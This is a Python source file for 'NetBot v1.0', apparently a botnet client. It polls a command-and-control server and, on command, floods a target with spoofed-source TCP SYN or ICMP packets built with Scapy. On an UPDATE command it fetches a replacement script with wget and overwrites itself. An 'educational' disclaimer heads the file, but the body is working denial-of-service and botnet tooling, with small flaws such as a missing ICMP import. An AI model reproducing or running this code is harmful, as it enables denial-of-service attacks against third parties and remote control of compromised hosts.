#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author     : Shankar Narayana Damodaran
# Tool       : NetBot v1.0
# 
# Description: This is a command & control center client-server code.
#              Should be used only for educational, research purposes and internal use only.
#

import socket
import time
import threading
import os
import subprocess
import signal
import random
from scapy.all import IP, TCP, send

class launchAttack:

    def __init__(self):
        self._running = True

    def terminate(self):
        self._running = False

    def run(self, n):
        if n[3] == "HTTPFLOOD":
            while self._running and attackSet:
                self.http_flood(n[0], int(n[1]))
                time.sleep(int(n[4]))

        if n[3] == "PINGFLOOD":
            while self._running:
                if attackSet:
                    self.ping_flood(n[0])
                else:
                    break

    def http_flood(self, target_ip, target_port):
        spoofed_ip = self.generate_spoofed_ip()
        ip_packet = IP(src=spoofed_ip, dst=target_ip)
        tcp_packet = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        packet = ip_packet / tcp_packet
        send(packet, verbose=0)

    def ping_flood(self, target_ip):
        spoofed_ip = self.generate_spoofed_ip()
        ip_packet = IP(src=spoofed_ip, dst=target_ip)
        icmp_packet = ICMP()
        packet = ip_packet / icmp_packet
        send(packet, verbose=0)

    def generate_spoofed_ip(self):
        return '.'.join(str(random.randint(1, 254)) for _ in range(4))


def Main():
    global attackSet
    attackSet = 0
    global updated
    updated = 0
    global terminate
    terminate = 0

    host = '192.168.0.174'  # NetBot CCC Server
    port = 5555  # NetBot CCC Port

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Establishing a TCP Connection
    try:
        s.connect((host, port))  # Connect to the CCC Server
        message = "HEARTBEAT"  # Sends Alive Pings to CCC Server
    except:
        print("CCC Server not online. Retrying every 15 seconds...")
        updated = 0
        time.sleep(15)
        Main()

    while True:
        try:
            s.send(message.encode())  # use a try catch
        except:
            Main()
        data = s.recv(1024)
        data = str(data.decode()).split('_')

        if len(data) > 1:
            attStatus = data[2]
            attHost = data[0]
            attPort = data[1]
        else:
            attStatus = "OFFLINE"

        print('CCC Response: ', attStatus)

        if attStatus == "LAUNCH":
            if attackSet == 0:
                attackSet = 1
                c = launchAttack()
                t = threading.Thread(target=c.run, args=(data,))
                t.start()
            else:
                time.sleep(15)
                if t.is_alive():
                    print('Attack in Progress...')
            continue
        elif attStatus == "HALT":
            attackSet = 0
            time.sleep(30)
            continue
        elif attStatus == "HOLD":
            attackSet = 0
            print('Waiting for Instructions from CCC. Retrying in 30 seconds...')
            time.sleep(30)
        elif attStatus == "UPDATE":
            if updated == 0:
                attackSet = 0
                os.system('wget -N http://192.168.0.174/netbot_client.py -O netbot_client.py > /dev/null 2>&1')
                print('Client Libraries Updated')
                updated = 1
                time.sleep(30)
            else:
                time.sleep(30)
        else:
            attackSet = 0
            print('Command Server Offline. Retrying in 30 seconds...')
            updated = 0
            time.sleep(30)

    s.close()

if __name__ == '__main__':
    Main()
